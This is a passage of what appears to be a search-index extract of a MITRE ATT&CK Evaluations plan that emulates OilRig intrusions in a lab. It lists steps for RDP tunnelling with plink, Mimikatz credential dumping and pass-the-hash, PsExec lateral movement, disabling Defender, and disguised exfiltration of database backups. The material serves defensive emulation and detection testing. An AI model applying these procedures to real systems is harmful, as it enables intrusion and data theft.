platform.","Display the contents of 01.txt in the terminal window.","Clean up on WATERFALLS by removing the binary and output file from C:\\Windows\\Temp\\."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["❗ NB: The function descriptions in TwoFace (contact.aspx) refer to the Mimikatz download as \"Arbitrary Folder Upload\" and the 01.txt exfiltration as \"File Download\" which is the reverse of how said activities are described in the emulation procedure; this is to match to CTI but results in slightly contradictory source code links.","TwoFace Webshell download file to victim: contact.aspx#L58-L115","TwoFace Webshell file upload file to C2: contact.aspx#L120-L145","TwoFace Webshell temp delete: contact.aspx#L150-L169","Mimikatz: Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Credential dumping: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/"]},{"i":"step-7---lateral-movement-to-ews-via-rdp-tunnel","l":"Step 7 - Lateral Movement to EWS via RDP Tunnel"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 7 emulates OilRig moving laterally to WATERFALLS (10.1.0.6). This is accomplished with a remote port forward using the plink command line tool(downloaded by SystemFailureReporter.exe). OilRig conducts a remote port forward from THEBLOCK (10.1.0.5) to the attacking machine to allow RDP access through port 3389 as user gosta."]},{"i":"biohazard-procedures-7","l":":biohazard: Procedures","p":["Download plink to THEBLOCK (10.1.0.5) using SideTwist and start plink tunnel to gain RDP access to WATERFALLS (10.1.0.6) from the Linux Attack Platform.","Execute the remote port forward command using SideTwist. Note: this SideTwist process will persist as long as the tunnel is open and as such will need to be closed after the activity is done. SideTwist will continue to execute via schtask so other commands can be issued to the implant if needed.","Ensure that the tunnel is open and listening on port 13389 on Linux Attack Platform.","You should see a result that looks like the following:","RDP to WATERFALLS (10.1.0.6) as user Gosta from Linux Attack Platform using the SSH tunnel."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Plink command line tool: Plink"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Plink: https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/","SSH: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","RDP: https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf","RDP: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"]},{"i":"step-8---lateral-movement-to-the-sql-server","l":"Step 8 - Lateral Movement to the SQL Server"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 8 emulates OilRig using the credentials collected for the user tous in the previous step to move laterally to the SQL server.","First, the webshell is used to download PsExec, RDAT, and a newly named Mimikatz to disk. Through the tunneled RDP, an elevated Command Prompt is opened and, using the NTLM hash for tous from the credential dump, Mimikatz pass the hash is executed to spawn a second shell as tous on WATERFALLS (10.1.0.6). As tous, RDAT is copied over to ENDOFROAD (10.1.0.7), then PsExec is executed to get a shell on ENDOFROAD (10.1.0.7)"]},{"i":"biohazard-procedures-8","l":":biohazard: Procedures","p":["Download psexec to WATERFALLS (10.1.0.6) as C:\\Windows\\System32\\ps.exe","Download RDAT to WATERFALLS (10.1.0.6) as Nt.dat","Redownload Mimikatz to WATERFALLS (10.1.0.6) as mom64.exe","In the RDP to WATERFALLS (10.1.0.6), open a new Command Prompt as Administrator, click yes to the UAC prompt, and execute Mimikatz PTH for tous","In the new Command Prompt spawned by the Mimikatz pass the hash, copy RDAT to ENDOFROAD (10.1.0.7)","In the new Command Prompt spawned by Mimikatz pass the hash, PsExec to the SQL server ENDOFROAD (10.1.0.7)"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["❗ NB: Once again, TwoFace (contact.aspx) refers to the \"downloads\" from this section of the emulation procedure as \"Abritrary Folder Upload(s)\" in the source code.","TwoFace Webshell download file to victim: contact.aspx#L58-L115","RDAT backdoor: RDAT"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["RDAT: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","PSExec: https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/","Mimikatz: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","Mimikatz: https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments"]},{"i":"step-9---sql-server-discovery","l":"Step 9 - SQL Server Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 9 emulates OilRig using the command prompt (in the context of tous) created by Mimikatz pass the hash and PSExec to perform discovery of the database backup files on the SQL server ENDOFROAD (10.1.0.7)."]},{"i":"biohazard-procedures-9","l":":biohazard: Procedures","p":["Discover version of SQL server","Discover SQL server database backup files"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Discovery: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","RDAT/Exfiltration: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/"]},{"i":"step-10---collection-and-exfiltration-of-database-files","l":"Step 10 - Collection and Exfiltration of Database Files"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 10 emulates OilRig collecting and exfiltrating backups of the database files via the EWS API.","OilRig first creates a new directory C:\\Programdata\\Vmware in which to stage the collected data. RDAT is then moved to the new directory and renamed to VMware.exe.","The newly named VMware.exe is used to read the data from sitedata_db.bak, split the data into 20000 byte chunks, and exfiltrate the chunks via EWS API to an attacker controlled email ( sistan@shirinfarhad.com). The stolen data is obfuscated within BMP images attached to the emails sent to sistan@shirinfarhad.com."]},{"i":"biohazard-procedures-10","l":":biohazard: Procedures","p":["Create directory C:\\Programdata\\Vmware","Move and rename RDAT as C:\\Programdata\\Vmware\\VMware.exe","Change directory into the SQL backup directory (PsExec has a character limit)","Execute RDAT to pull back target database backup file."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["RDAT chunking: Program.cs#L104-L109","RDAT appending file bytes to guest.bmp: Program.cs#L117-L129","RDAT leverages EWS API to exfil chunks: Program.cs#L95-L115"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["RDAT/Exfiltration: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","TwoFace webshell: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","C2 Communications: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"]},{"i":"step-11---cleanup","l":"Step 11 - Cleanup"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 11 emulates OilRig's cleanup and egress from the target network."]},{"i":"biohazard-procedures-11","l":":biohazard: Procedures","p":["From within your PsExec session from WATERFALLS to ENDOFROAD:","Delete RDAT:","Delete the parent directory:","Terminate the PsExec session to ENDOFROAD:","Terminate the command prompt spawned by Mimikatz running as Tous","From your elevated command prompt on WATERFALLS(via RDP):","Delete Mimikatz, RDAT, and PsExec from disk.","From Kali:","Find the PID of the SSH tunnel and terminate it.","From your C2 callback into THEBLOCK:","Instruct the SideTwist agent to delete VALUEVAULT, the VALUEVAULT output, plink.exe, and the SideTwist killswitch file.","\uD83D\uDD34 End of Scenario. Note: SideTwist will continue to execute but will not beacon without the update.xml file"]}],[{"l":"DEPENDENCIES"},{"l":"CALDERA C2 Server","p":["Linux/Mac OS, 64-bit","git commandline installed","python3.7+ with pip3","python3.9+ recommended","golang 1.17+","required for dynamic agent compilation"]},{"l":"Attacker Machine Dependencies","p":["Linux OS, 64-bit","Kali recommended","Can be the same machine as the CALDERA C2 server if needed.","Command-line tools","xfreerdp","xdotools","curl"]},{"l":"SETUP"},{"l":"Download and Install CALDERA","p":["Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server, or the \"attacker\" host. For the purposes of this walkthrough, the C2 server will have an IP address of 192.168.0.4.","Add the emu plugin add emu to your conf/local.yml configuration file. Feel free to enable or disable other plugins by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.","Download pip dependencies.","Download required payloads for emu plugin.","Run your C2 server from the caldera directory. This will unzip encrypted executables throughout the adversary-emulation-library and ingest its emulation plans.","Update payload name for mimikatz to m64.exe. Note: this may require a server restart for Caldera to pick up the new payload."]},{"l":"RUNNING THE OPERATION"},{"l":"Launch Agents","p":["Launch the first agent by running the following command on 10.1.0.5 (THEBLOCK) as the user gosta. The password for gosta is d0ntGoCH4ingW8trfalls. Note that you may need to replace gosta with the applicable username, if you are not using the gosta user. This agent is meant to replace SideTwist payload used in the original scenario.","RDP to 192.168.0.4, the Kali attacker host, as user saka with password ceKa#zUUc4^9yZ. You may need to modify the command so the server value matches your attacker host's IP address. Launch the second agent by running the following command. Note: keep this RDP open as this will be leveraged by xfreerdp in the executed Caldera operation.","Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is red, default password is admin).","Make sure you can see your agents after clicking the agents option on the menu on the left, under \"Campaigns\".","For best results, make sure you don't have other agents currently beaconing in."]},{"l":"Planner","p":["This port requires CALDERA to run each ability on a specific agent. For example, some abilities should run only on the gosta group of agents, while other abilities should run only on the kali group of agents. Therefore, this port uses a custom planner which specifies the agent group that should run each ability.","The commands to start agents will include a -group flag to specify the agent's group. This group will correspond to the group listed in the custom planner. If the groups that are specified in Launch Agents are edited, the group names in the planner will need to be updated correspondingly."]},{"l":"Fact Setup","p":["Before running the operation, you will need to make sure that the OilRig fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select OilRig (Emu), which is the fact source for the OilRig adversary. From there, update the following facts as needed:","initial.target.user: The username of the initial target.","initial.target.password: The password of the initial target.","second.target.host: The hostname address of the second target.","second.target.ip: The IPv4 address of the Exchange server.","network.domain.name: The network domain name for initial target system","caldera.server.ip: The IPv4 address of the attacker system.","caldera.user.password: The password for the attacker system.","caldera.user.name: The username of the attacker system.","second.target.user: The username for the SQL server administrator.","second.target.ntlm: NTLM hash value for the user of the SQL server administrator.","third.target.ip: The IPv4 address of the SQL server.","exfil.target.email: The adversary-controlled email address used to exfiltrate data.","server.api.key: The API key for the CALDERA server."]},{"l":"Operation Setup","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select OilRig.","For the Fact Source, select OilRig (Emu).","For the Parser, select \"Do not use default parsers\".","For the Planner, select OilRig Planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes."]},{"l":"Cleanup","p":["The following commands should be run on 10.1.0.5 (THEBLOCK):"]},{"l":"Exfiltrated Files","p":["Throughout the operation, some files will be exfiltrated through a CALDERA agent back to the CALDERA server.","The directory on the CALDERA server machine that contains the uploaded files depends on the exfil_dir setting within the CALDERA configuration file (/tmp/caldera by default). Within this exfil directory, you'll find a subdirectory of the format hostname-agentidentifier, where hostname is the hostname where the agent was running, and the agent identifier is the unique identifier for the agent. The encrypted uploaded files will be in that subdirectory.","To decrypt the uploaded files, you can use the decryption utility provided in app/utility/file_decryptor.py within the CALDERA main directory. Run it and pass in the path to the CALDERA configuration file used (e.g. default.yml or local.yml) as well as the path to the input file and output file (change file paths in the example as needed)."]},{"i":"modificationsdeviations-from-the-original-emulation-plan","l":"MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN"},{"l":"Step 1","p":["Initial access will be performed by running a CALDERA agent executable named SystemFailureReporter.exe, rather than a malicious Word document with VBA macros. The agent will act as the remote access implant and is a compiled .exe written in Golang.","The SideTwist payload, update.xml, and b.doc will not be used","SystemFailureReporter.exe as used in evals will be replaced by the CALDERA agent named SystemFailureReporter.exe.","Following initial access, the agent will use two VBS scripts to collect the hostname and username environment variables, mimicking the macro used in evals.","The agent will not perform sandbox detection checks using Application.MouseAvailable.","The agent will not use GetUserName API, GetComputerName API, and GetDomainName API to find the current user, hostname, and domain respectively."]},{"l":"Step 2","p":["The CALDERA agent will run all of the commands in Step 2 via cmd.exe. However, the commands will be executed separately instead of being chained together. From a defender's viewpoint, the port's execution will appear as:","as opposed to the scenario's execution, which would have appeared as:"]},{"l":"Step 3","p":["b.exe will be downloaded to the workstation as a payload from the CALDERA server. In the port, b.exe will be automatically deleted when it stops running, as opposed the original scenario, where b.exe is deleted in Step 11.","fsociety.dat will be exfiltrated via the C2 channel to the CALDERA exfil directory, which is by default /tmp/caldera on the CALDERA server host. More information regarding exfiltrated files is available above."]},{"l":"Step 4","p":["Contact.aspx will be uploaded as a payload to the CALDERA server. It will be downloaded to THEBLOCK through the C2 channel, and will then be copied to the WATERFALLS Exchange Web Services directory. In the original scenario, contact.aspx is downloaded directly to the C:\\Users\\Public\\ directory on THEBLOCK. However, in the port, CALDERA will download contact.aspx to the agent's current directory, which will be C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\. Then, Step 4.A.1 will copy the file from C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\ to C:\\Users\\Public\\.","The ability labeled as Step 4.A.2 \"Server Software Component: Web Shell\" (T1505.003) includes Step 4.A.3, \"Hide Artifacts: Hidden Files & Directories\" (T1564.001).","Step 4.A.5, \"Indicator Removal on Host: File Deletion\" (T1070.004) will be included in the cleanup command for Step 4.A.1."]},{"l":"Step 5","p":["This step will be performed by the agent that was manually launched on the \"attacker\" system.","The -s flag was added to the curl commands to activate \"silent\" mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The -s flag will also restrict error messages from appearing.","In this step and in all following steps, the password for gosta has been changed from d0ntGoCH4$ingW8trfalls to d0ntGoCH4ingW8trfalls."]},{"l":"Step 6","p":["The -s flag was added to the curl commands to activate \"silent\" mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The -s flag will also restrict error messages from appearing."]},{"l":"Step 7","p":["plink.exe will be downloaded to the workstation as a payload from the CALDERA server. In the original scenario, plink.exe is initially downloaded to C:\\Users\\Public\\Downloads\\plink.exe. In the port, it will be downloaded through the C2 channel to the same folder as the agent on the THEBLOCK. Then, it will be copied to the Downloads folder.","The additional -no-antispoof flag was added to avoid the required interaction step.","Step 7.A.3, \"Valid Accounts: Domain Accounts\" (T1078.002) is included in Step 7.A.4.","Steps 7.A.2 and 7.A.4 are run using exec-background which runs a command as a background process. The /cert-ignore parameter is also added to Step 7.A.4.","The password for saka has been changed from $ceKa#zU$Uc4^9yZ to ceKa#zUUc4^9yZ."]},{"l":"Step 8","p":["xdotool is used to control the RDP session to 10.1.0.6. Because xdotool controls a remote system using pre-determined key presses, the sequence of key presses in Step 8 may need to be modified depending on your environment.","Step 8.A.9 includes Steps 8.A.5 through 8.A.8."]},{"l":"Step 9","p":["In continuation from Step 8, xdotool is used to control the RDP session."]},{"l":"Step 10","p":["In continuation from Step 8, xdotool is used to control the RDP session.","Step 10.A.6 includes Steps 10.A.1-10.A.6"]},{"l":"Step 11","p":["Because the gosta agent replaces SideTwist, the gosta agent will be killed instead of killing SideTwist. Additionally, update.xml was not used in the port so it does not need to be deleted in the cleanup stage.","The API key fact value may need to be updated to your server's API key in order to modify the gosta agent's watchdog value, which then kills the agent.","b.exe was saved to agent's location as a payload, was run from that location, and was automatically deleted when the command finished. Therefore, it will not be deleted in this step."]}],[{"l":"Scenario Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by OilRig.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating OilRig to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","This scenario also utilizes Mimikatz, Plink and PsExec as payloads:","Mimikatz","Plink","PsExec.exe"]},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: Kali Linux 2019.2","Mail and File Server: Kali Linux 2019.2"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4","Mail and Apache Server","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes payloads that model malware previously used by OilRig.","These utilities include credential dumpers, implants, and file exfiltration.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","Implants are configured to connect back to static IP address 192.168.0.4. Build instructions for each payload can be found with source code in their respective directories."]},{"i":"linux-attack-platform-setup--19216804","l":"Linux Attack Platform Setup \\ 192.168.0.4","p":["Download the OilRig Adversary Emulation Library to the /opt/ directory","Use the Linux commands below to populate the binaries in the expected directories for the scenario:","Download Mimikatz to the Resources/payloads/TwoFace/ directory. Rename Mimikatz executable as m64.exe.","Download Plink to the Resources/payloads/SideTwist/ directory","Download PsExec.exe to the Resources/payloads/TwoFace/ directory","Install FreeRDP"]},{"i":"mail-and-file-server-setup--19216805","l":"Mail and File Server Setup \\ 192.168.0.5","p":["Install Apache","Install Postfix","Stage the SideTwist dropper Marketing_Materials.zip to /var/www/html","Run the install-configure-postfix.sh bash script as sudo","Run the setup-apache-fileserver.sh bash script as sudo","Note: You may need to chmod the scripts to allow them to run."]},{"l":"Target Infrastructure","p":["4 targets, all domain joined to the boombox domain:","SQL Server: tested and executed on CentOS 7.9","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763","Exchange Server: tested and executed on Windows Server 2k19 - Build 17763","Exchange Admin Workstation: tested and executed on Windows 10 - Build 17763"]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","SQL Server","endofroad","10.1.0.7","Domain Controller","diskjockey","10.1.0.4","Exchange Server","waterfalls","10.1.0.6","Exchange Admin Workstation","theblock","10.1.0.5"]},{"i":"configure-domain-controller-diskjockey-10104","l":"Configure Domain Controller diskjockey\\ 10.1.0.4","p":["Create the user accounts as used in the scenario:","Domain Admins","Domain Users","EWS Admins, Domain Users","EWS Admins, SQL Admins, Domain Users","gosta","groups","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","mariam","Note: in the scenario, DNS records were manually created to emulate network activity from suspect domains","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","Open Windows Defender, toggle all nobs to the off position.","shiroyeh","shiroyeh_admin","tous","username"]},{"i":"configure-workstation-theblock-10105","l":"Configure Workstation theblock\\ 10.1.0.5","p":["Ensure Microsoft Office is installed and that you're able to edit a document. This will ensure the macros run correctly against the host.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-ews-server-waterfalls-10106","l":"Configure EWS Server waterfalls\\ 10.1.0.6","p":["Setup Exchange Server to host OWA and EAC.","Create the \"EWS Admins\" group, adding tous, gosta","Install MSSQL","Create a scheduled task to run the sql_connection.bat upon system startup:","Reboot the machine and verify connection in PowerShell:","Open Windows Defender, toggle all nobs to the off position.","In the same PowerShell window, run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-sql-server-endofroad-10107","l":"Configure SQL Server endofroad\\ 10.1.0.7","p":["Install MSSQL and configure data to be stored locally on the C: drive.","Create an \"SQL Admins\" domain group with tous as a member, additionally giving tous access permissions and ownership of the DB.","Sign in as tous and create a new database called sitedata.","Import the minfac.csv data file to populate the database.","Create a backup of the database to the drive for later exfiltration by the adversary","Note: For the purpose of execution, this directory was C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","Open port 1433 in Windows Defender Firewall","Add the \"SQL Admins\" group to Local Administrators"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Issues"]},{"l":"Network Diagram","p":["A network diagram is available that displays the domains and infrastructure that was used to support the setup and execution of the Emulation plan."]}],[{"i":"#","p":["Based on open-source intelligence, the ATT&CK ® Evaluations team created the below scenario leveraging techniques seen from Oilrig in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a diagram, scenario overview, step-by-step breakdown, and an infrastructure diagram."]},{"i":"emulation-scenario","l":"Emulation Scenario \uD83D\uDCD6","p":["This scenario follows OilRig’s multi-phase approach to exfiltrating sensitive data from a targeted server. OilRig leverages spearphishing to gain initial access onto an administrator’s workstation and deploys their SideTwist malware. Once persistence is established on the victim network, the attackers will escalate privileges and move laterally onto an EWS server. Further enumeration of the EWS server will lead to OilRig’s identification of a SQL server storing confidential critical infrastructure data. Characteristics of this campaign include: custom webshells, Windows and Microsoft 365 exploitation, and key attacker objective on obtaining control of the SQL server to steal victim files. Phase 1: This scenario begins with the legitimate user Gosta downloading and opening a malicious Word document sent via spearphishing. When the document is first opened, the enabled macros will stealthily install the SideTwist backdoor on Gosta’s Windows host machine. SideTwist connects to a C2 server using GET & POST requests, with responses hidden in the source code of an NotFlickr page. After performing initial enumeration on Gosta’s device, OilRig discovers that the user is a member of the administrator group on an Exchange Web Server (EWS). Phase 2: The SideTwist backdoor harvests credentials and collects Gosta's password using VALUEVAULT, a credential theft tool. Using Gosta’s stolen EWS credentials, the attackers establish a remote connection to EWS via RDP tunneling. Once connected to the EWS, OilRig deploys the TwoFace webshell on the server to gain access to additional resources on the network. The use of TwoFace to perform enumeration on the EWS will lead attackers to discover a SQL server. Phase 3: Next, OilRig will use the TwoFace webshell to download Mimikatz and dump the credentials of targeted administrators on the EWS. Using the stolen credentials of Tous, an SQL admin, the adversary will perform pass-the-hash to move laterally onto the targeted SQL server. This signals the start of the data exfiltration phase. The attackers will gain persistent access to the database through the custom RDAT backdoor, copy the database backup files and exfiltrate them via the EWS API to an attacker-controlled mailbox.","Operations Flow Diagram","Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["As the user Tous, OilRig uses the command prompt created by the Mimikatz pass the hash to perform discovery of the database backup files on the SQL server. OilRig will collect and exfiltrate the backups of the database files via the EWS API. OilRig first creates a new directory in which to stage the collected data. The attackers will move RDAT to this new directory and rename it as VMware.exe. The newly named backdoor is used to read the data, split it into 20,000 byte chunks, and exfiltrate it via EWS API to an attacker-controlled email ( sistan@shirinfarhad.com). The stolen data is obfuscated within BMP images attached to the emails sent to the attackers.","cmd","cmd Mimikatz RDAT","Credential dumping https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/|","Discovery https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/ RDAT/Exfiltration https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/ TwoFace https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/ C2 Communications https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/|","Finally, the adversary deletes all artifacts and files from the EWS and SQL server, terminates command prompts, ups and exits the target network.","https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/","In order to escalate privileges, OilRig will use SideTwist to download VALUEVAULT onto the Gosta’s device. VALUEVAULT will be used to conduct low privilege credential dumping and retrieve the plaintext password for Gosta. The attackers send this data back to the C2, obfuscating communications via HTTP POST requests.","Mimikatz TwoFace Webshell","Network Discovery https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/ TwoFace https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/|","OilRig gains initial access from user Gosta ( THE BLOCK, 10.1.0.5) downloading and opening a Microsoft Word document received from a spearphishing email. Once Gosta enables the malicious macros embedded in the document, the SideTwist payload is stealthily dropped onto the system. The executable is initially named b.doc and will later be renamed to SystemFailureReporter.exe. OilRig then will use SideTwist to conduct initial discovery on the Windows host machine ( THE BLOCK) and connect to the C2 server over XOR encrypted protocol HTTP on port 443. The attackers C2 infrastructure consists of an HTTP server that hosts a dummy NotFlickr page. Commands with SideTwist are embedded between script tags on this webpage. Analyst Note: The document is pre-positioned in the environment. We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs.","OilRig moves laterally onto the EWS via remote port forward using the plink command line tool. The adversary conducts a remote port forward from Gosta’s workstation to the attacking machine to allow RDP access through port 3389 as user Gosta.","OilRig uses the TwoFace webshell to perform enumeration on the EWS to discover the SQL server ( ENDOFROAD, 10.1.0.7). OilRig first uses the webshell to perform some initial discovery by enumerating the current user, system network configuration and system network connections. At this point, the attackers identify an open connection to the SQL server via a port commonly associated with SQL. Analyst Note: TwoFace comprises 2 separate webshells - the first is deployed initially to save and load the second webshell, which is the one used to run commands on the compromised server. However, due to team constraints, we deployed a single webshell that can upload/download files and run commands.","OilRig uses the webshell to download Mimikatz to the EWS and uses elevated privileges to dump credentials. The dumped credentials, which include those for SQL server administrator Tous, are exfiltrated back to the C2 ( 192.168.0.4) via the webshell. After exfiltration is complete, OilRig deletes both Mimikatz and the dumped credentials from the directory on the EWS.","OilRig utilizes SideTwist to perform a string of initial enumeration commands via the command line. Specifically, the adversary enumerates the current user, system information and configuration, domain users, domain groups, domain accounts, local groups, network connections, running processes, running services, and a registry key value to check if RDP is enabled. At this point, OilRig has discovered the following: the current user Gosta is a member of the EWS Admins group, the presence of an EWS server ( WATERFALLS, 10.1.0.6) on the network which is a part of the Exchange Trusted Subsystem group, and the existence of several other administrator groups (including SQL Admins, of which user Tous is a member).","Plink/SSH commands https://www.opmd.fr/blog/dnspionage-focus-on-internal-actions/ EWS lateral movement https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/|","PSExec https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/ Pass the Hash https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf|","PSExec TwoFace Webshell RDAT Mimikatz Cmd","Reporting","SideTwist","SideTwist https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ VALUEVAULT https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network Hard Pass http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt","SideTwist https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ VBA coding/macros https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Enumeration https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/ EWS/Exchange Trusted Subsystem Discovery https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/|","SideTwist VALUEVAULT Golang version of “ Windows Vault Password Dumper” Source code Binary","Software","Step 1 (Initial Compromise & Persistence) T1566.002 T1204.002 T1059.005 T1082 T1033 T1497.001 T1027 T1105 T1036 T1083 T1053.005 T1016 T1071.001 T1573.001","Step 10 (Clean-up & Egress) T1070.004","Step 2 (Workstation Discovery) T1059.003 T1033 T1082 T1016 T1087.002 T1069.002 T1201 T1087.001 T1069.001 T1049 T1057 T1007 T1012 T1018","Step 3 (Host Discovery & Credential Collection) T1105 T1555.004 T1041","Step 4 (Web Shell Installation) T1105 T1570 T1505.003 T1564.001 T1070.004","Step 5 (EWS Discovery) T1505.003 T1033 T1016 T1049","Step 6 (Credential Dumping) T1105 T1003.001 T1041 T1070.004","Step 7 (Lateral Movement to EWS) T1105 T1572 T1078.002 T1021.001","Step 8 (Lateral Movement to SQL Server) T1505.003 T1105 T1550.002 T1059.003 T1570 T1021.002 T1569.002","Step 9 (SQL Server Discovery, Collection & Exfiltration) T1083 T1074.001 T1036.006 T1005 T1030 T1048.003 T1027","Steps","TwoFace https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/ PSExec https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/|","TwoFace Webshell","TwoFace webshell plink SideTwist","User Story","Using Gosta’s stolen EWS credentials, OilRig installs the TwoFace web shell for persistence on the EWS. This is accomplished by downloading TwoFace (named contact.aspx) via the SideTwist executable. The attackers will then copy the webshell from Gosta’s Windows workstation to the EWS, obfuscating the activity with attrib + h. OilRig covers their tracks by deleting TwoFace from Gosta’s user directory.","Using the credentials collected for the SQL administrator Tous, the attackers move laterally to the SQL server. First, the webshell is used to download PsExec, RDAT, and a newly 